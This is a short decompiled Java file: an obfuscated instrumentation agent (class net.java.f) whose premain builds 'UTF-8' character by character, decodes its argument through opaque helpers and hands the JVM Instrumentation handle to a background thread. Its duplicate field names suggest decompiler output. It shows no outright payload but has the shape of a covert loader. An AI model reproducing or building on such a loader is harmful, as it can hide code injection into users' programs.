package net.java;

import java.lang.instrument.Instrumentation;

public class f implements Runnable
{
    private byte[] a;
    private Instrumentation a;
    
    public static void premain(final String s, final Instrumentation a) {
        byte[] a2 = null;
        if (s != null) {
            try {
                final StringBuilder sb;
                (sb = new StringBuilder()).append('U');
                sb.append('T');
                sb.append('F');
                sb.append('-');
                sb.append('8');
                a2 = l.a(s.getBytes(sb.toString()));
            }
            catch (final Exception ex) {
                ex.printStackTrace();
            }
        }
        m.a();
        final f f;
        (f = new f()).a = a2;
        f.a = a;
        new Thread((Runnable)f).start();
    }
    
    public void run() {
        l.a((Object)new Object[] { this.a, this.a, 1, null, null, m.a.trim() });
    }
}
